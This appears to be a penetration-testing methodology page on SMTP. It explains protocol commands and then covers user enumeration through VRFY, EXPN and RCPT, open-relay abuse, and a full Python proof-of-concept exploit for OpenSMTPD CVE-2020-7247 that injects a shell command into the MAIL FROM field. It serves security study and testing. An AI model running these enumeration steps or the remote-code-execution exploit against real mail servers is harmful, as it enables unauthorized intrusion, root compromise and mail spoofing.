# Simple Mail Transfer Protocol (SMTP) - Methodology

### Overview

The `Simple Mail Transfer Protocol (SMTP)` protocol is an Internet standard for
electronic email transmission. The `SMTP` protocol operates at the
`Application Layer (L7)` layer of the `OSI` model.

First defined by [`RFC 821`](https://datatracker.ietf.org/doc/html/rfc821) in
1982, it was last updated in 2008 with `Extended SMTP` additions in the
[RFC 5321](https://datatracker.ietf.org/doc/html/rfc5321), which is the
protocol in widespread use today.

Although electronic mail servers and other mail transfer agents use `SMTP` to
send and receive mail messages, user-level client mail applications typically
only use `SMTP` for sending messages to a mail server for relaying. For
retrieving messages, client applications usually use either the `IMAP` or
`POP3` protocols.

`SMTP` communication between mail servers is conducted over the `TCP` port 25.
Mail clients on the  other hand, often submit the outgoing emails to a mail
server on `TCP` port 587.

For secure transmission that protect, through encryption using cryptographic
protocols, `SMTP` can be secured with an additional `SSL`/`TLS` layer
(`SMTPS`). Such connections can be made using the `STARTTLS` command.

Although proprietary systems (such as Microsoft Exchange and IBM Notes) and
webmail systems (such as Outlook.com, Gmail and Yahoo! Mail) use their own
non-standard protocols to access mail box accounts on their own mail servers,
all use `SMTP` when sending or receiving email from outside their own systems.

#### SMTP COMMANDS

A client communicates with an `SMTP` server (e-mail server) by using `SMTP`
commands:
  - a core list of `SMTP` commands that all `SMTP` servers supports.
  - extended `SMTP` commands (also called `ESMTP commands`) to allow more
    flexibility and additional features are also supported by most `SMTP`
    servers. In official documentation, these `ESMTP` commands are also
    referred to as `SMTP` service extensions.

##### Basic SMTP commands

`HELO (Hello)`

The client sends this command to the `SMTP` server to identify itself and
initiate the `SMTP` conversation. The domain name or IP address of the SMTP
client is usually sent as an argument together with the command (e.g. `HELO client.example.com`). If a domain name is used as an argument with the `HELO`
command, it must be a fully qualified domain name (also called FQDN).

`MAIL FROM`

Specifies the e-mail address of the sender.
This command also tells the `SMTP` server that a new mail transaction is starting
and makes the server to reset all its state tables and buffers etc.
This command is usually sent as the first command after the identifying and
login process.
If the senders e-mail address is accepted the server will reply with a 250 OK
reply code.

```
Example:
C: MAIL FROM:<mail@samlogic.com>
S: 250 OK
```

`RCPT TO (Recipient To)`

Specifies the e-mail address of the recipient.
This command can be repeated multiple times for a given e-mail message in order
to deliver a single e-mail message to multiple recipients.

```
Example:
C: MAIL FROM:<mail@samlogic.com>
S: 250 OK
C: RCPT TO:<john@mail.com>
S: 250 OK
C: RCPT TO:<peggy@mail.com>
S: 250 OK
```

`DATA`

The DATA command starts the transfer of the message contents (body text,
  attachments etc).
After that the DATA command has been sent to the server from the client, the
server will respond with a 354 reply code.
After that, the message contents can be transferred to the server.
When all message contents have been sent, a single dot (“.”) must be sent in a
line by itself.
If the message is accepted for delivery, the `SMTP` server will response with a
250 reply code.

```
Example:
C: DATA
S: 354 Send message content; end with <CRLF>.<CRLF>
C: Date: Thu, 21 May 2008 05:33:29 -0700
C: From: SamLogic <mail@samlogic.com>
C: Subject: The Next Meeting
C: To: john@mail.com
C:
C: Hi John,
C: The next meeting will be on Friday.
C: /Anna.
C: .
S: 250 OK
```

`RSET (Reset)`

If the RSET command is sent to the e-mail server the current mail transaction
will be aborted.
The connection will not be closed (this is reserved for the QUIT command, see
  below) but
all information about the sender, recipients and e-mail data will be removed
and buffers and state tables will be cleared.

`VRFY (Verify)`

This command asks the server to confirm that a specified user name or mailbox
is valid (exists).
If the user name is asked, the full name of the user and the fully specified
mailbox are returned.
In some e-mail servers the VRFY command is ignored because it can be a security
hole.
The command can be used to probe for login names on servers.
Servers that ignore the VRFY command will usually send some kind of reply, but
they will not send the information that the client asked for.

`NOOP (No operation)`

The NOOP command does nothing else than makes the receiver to send an OK reply.
The main purpose is to check that the server is still connected and is able to
communicate with the client.

`QUIT`

Asks the server to close the connection.
If the connection can be closed the servers replies with a 221 numerical code
and then is the session closed.


##### Extended SMTP (ESMTP) Commands

If a client initiates the `SMTP` communication using an EHLO (Extended Hello)
command instead of the HELO command some additional `SMTP` commands are often
available.
They are often referred to as Extended `SMTP` (ESMTP) commands or `SMTP` service
extensions.
Every server can have its own set of extended `SMTP` commands.
After the client has sent the EHLO command to the server, the server often
sends a list of available ESMTP commands back to the client.

`EHLO (Extended Hello)`

Same as HELO but tells the server that the client may want to use the Extended
SMTP (ESMTP) protocol instead.
EHLO can be used although you will not use any ESMTP command.
Servers that do not offer any additional ESMTP commands will normally at least
recognize the EHLO command and reply in a proper way.

`AUTH (Authentication)`

The AUTH command is used to authenticate the client to the server.
The AUTH command sends the clients username and password to the e-mail server.
AUTH can be combined with some other keywords as PLAIN, LOGIN and CRAM-MD5
(e.g. AUTH LOGIN) to use different login methods and different levels of
security.

```
Example:
S: 220 smtp.server.com Simple Mail Transfer Service Ready
C: EHLO client.example.com
S: 250-smtp.server.com Hello client.example.com
S: 250-SIZE 1000000
S: 250 AUTH LOGIN PLAIN CRAM-MD5
C: AUTH LOGIN
S: 334 VXNlcm5hbWU6
C: adlxdkej
S: 334 UGFzc3dvcmQ6
C: lkujsefxlj
S: 235 2.7.0 Authentication successful
```

After that the AUTH LOGIN command has been sent to the server, the server asks
for username and password by sending BASE64 encoded text (questions) to the
client.
“VXNlcm5hbWU6” is the BASE64 encoded text for the word "Username" and
“UGFzc3dvcmQ6” is the BASE64 encoded text for the word "Password" in the
example above.
The client sends username and password also using BASE64 encoding ("adlxdkej",
in the example above, is a BASE64 encoded username and "lkujsefxlj" is a BASE64
encoded password).


`STARTTLS (Start Transport Layer Security)`

E-mail servers and clients that uses the `SMTP` protocol normally communicate
using plain text over the Internet.
To improve security, an encrypted TLS (Transport Layer Security) connection can
be used when communicating between the e-mail server and the client.
TLS is most useful when a login username and password (sent by the AUTH
command) needs to be encrypted.
TLS can be used to encrypt the whole e-mail message, but the command does not
guarantee that the whole message will stay encrypted the whole way to the
receiver;
Some e-mail servers can decide to send the e-mail message with no encryption.
But at least the username and password used with the AUTH command will stay
encrypted.

```
Example combining the STARTTLS and AUTH LOGIN command to make a secure login to
an e-mail server:
S: 220 smtp.server.com Simple Mail Transfer Service Ready
C: EHLO client.example.com
S: 250-smtp.server.com Hello client.example.com
...
C: STARTTLS
S: 220 TLS go ahead
C: EHLO client.example.com
S: 250-smtp.server.com Hello client.example.com
S: 250-SIZE 1000000
S: 250-AUTH LOGIN PLAIN CRAM-MD5
S: 250 HELP
C: AUTH LOGIN
S: 334 VXNlcm5hbWU6
C: adlxdkej
S: 334 UGFzc3dvcmQ6
C: lkujsefxlj
S: 235 2.7.0 Authentication successful
```

The client sends the EHLO command again to the e-mail server and starts the
communication from the beginning, but this time the communication will be
encrypted until the QUIT command is sent.

`SIZE`

The SIZE command has two purposes: the `SMTP` server can inform the client what
is the maximum message size and
the client can inform the `SMTP` server the (estimated) size of the e-mail
message that will be sent.
The client should not send an e-mail message that is larger than the size
reported by the server, but normally it is no problem if the message is
somewhat larger than the size informed by the client to the server.


`HELP`

This command causes the server to send helpful information to the client, for
example a list of commands that are supported by the `SMTP` server.

### SMTP client

###### Manual sender

The `telnet` or `netcat` utilities can be used to send mail through a SMTP
service:

```
telnet/nc <IP> <PORT>
HELO <DOMAIN>
334 VXNlcm5hbWU6
<BASE64_USERNAME>
334 UGFzc3dvcmQ6
<BASE64_PASSWORD>
235 authenticated.
MAIL FROM:<USERNAME>@<DOMAIN>
RCPT TO:<USERNAME>@<DOMAIN>
<DATA>
.
```

The `telnet` or `netcat` utilities do not support the use of SSL / TLS. If the
SMTP service requires the use of the SSL / TLS layer, for instance for services
exposed on the TCP port 587, the `openssl` utility can be used as basic SMTP
client:

```
openssl s_client -starttls smtp -crlf -connect <HOSTNAME | IP>:<PORT>
```   

A `SMTP` service exposed on the TCP port 25 may also require the use of the
SSL / TLS by only supporting the `STARTTLS` `SMTP` command:

```
telnet <HOSTNAME | IP> <PORT>

EHLO
[...]
250-SIZE X
250-STARTTLS
250 OK
```   

###### Automated sender

The `sendemail` utility can be used to send emails, optionally with file
attachment(s), through an exposed `SMTP` service:

```
sendemail -t <RCPT_EMAIL> -f <FROM_EMAIL> -u '<MAIL_SUBJECT>' -m '<MAIL_BODY>' -s <SMTP_SERVER>[:<SMTP_PORT> [-a <FILE> [<FILE2> ...]]
```

### User Enumeration

The `EXPN`, `VRFY` and `RCPT` commands can be used, if they have not been
disabled, to enumerate valid username.  

The `EXPN` command is used to reveal the actual address of users aliases and
lists of email. The `VRFY` command can confirm the existence of names of valid
users.

The enumeration can be conducted manually using the `telnet` or `netcat`
utilities or automatically using `Metasploit`, `nmap` or `smtp-user-enum`.

###### Manual enumeration

The following commands can be used to check if the `EXPN`, `VRFY` and `RCPT`
commands are available and to manually enumerate valid usernames and emails:

```
telnet/nc <IP> <PORT>
...

---

EXPN <USERNAME>
-> 250 2.1.5 <USERNAME@DOMAIN>
-> 550 5.1.1 <USERNAME>... User unknown

---

VRFY <USERNAME>
-> 250 2.1.5 <USERNAME@DOMAIN>
-> 550 5.1.1 <USERNAME>... User unknown

---

MAIL FROM: fake@localhost.com
RCPT TO: <USERNAME>
-> 250 2.1.5 <USERNAME>... Recipient ok
-> 550 5.1.1 <USERNAME>... User unknown

---
```

###### Automatic enumeration

The `smtp-user-enum` can be used to automatically enumerate usernames:

```
smtp-user-enum [-M EXPN/VRFY/RCPT ] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )
```

The following bash one-liner may be used as well to automatically enumerate
usernames:

```
for x in $(cat <USERFILE>); do echo VRFY $x | nc -nv -w 1 <TARGET> <PORT> 2>/dev/null | grep ^’250’; done
```

The `smtp-enum-users` `nmap` script and the `auxiliary/scanner/smtp/smtp_enum`
`Metasploit` module can be used as well.

### Open relay

An `SMTP` server that works as an open relay, is a email server that does not
verify if the user is authorized to send email from the specified email
address. Therefore, users would be able to send email originating from any
third-party email address.

While fully open relay is not that usual, "Partially Open Mail Relay" are more
common.  
This occurs when the mail relay can be used to do one of the following:
  - email from an external source address to an internal destination address ;
  - email from an internal source address to an internal destination address.

###### Manual exploitation

the following commands can be used to manually exploit an open relay SMTP
server:

```
telnet/nc <IP> <PORT>
HELO
# HELO <DOMAIN>
MAIL FROM:<USERNAME>@<CURRENT_DOMAIN>
RCPT TO:user@otherdom.com
DATA
.
```

If relaying is not permitted, the server should respond with an error message
"Relaying denied".

###### Automatic detection and exploitation

The `smtp-open-relay.nse` `nmap` script can be used to detect open relay.  

The `scanner/smtp/smtp_relay` `Metasploit` module can be used to exploit a
misconfigured server.

### Known vulnerabilities

###### LPE and RCE in OpenSMTPD (CVE-2020-7247)

Due to a default in the way shell metacharacters are filtered, a vulnerability
arise in `OpenBSD Simple Mail Transfer Protocol Daemon (OpenSMTPD) < 6.6.2`.
`OpenSMTPD` was initially developed for OpenBSD but is currently used by
others distros : FreeBSD, Debian, Ubuntu, Fedora, RHEL, etc.

The vulnerability permit the execution of code as root:
  - either locally if `OpenSMTPD` listens on the loopback interface and only
  accepts mail from localhost (default configuration)
  - or both locally and remotely, if `OpenSMTPD` listens on all interfaces and
  accepts external mail

More information about the vulnerability specifics:
`https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt`.

The following Proof of Concept exploit code can be used to exploit the
vulnerability:

```
# Source : https://www.exploit-db.com/exploits/47984

# Exploit Title: OpenSMTPD 6.6.2 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD < 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
#
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
res = s.recv(1024)
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
s.recv(1024)
s.send(b'DATA\r\n')
s.recv(1024)
s.send(b'\r\nxxx\r\n.\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.recv(1024)
print('[*] Done')
```
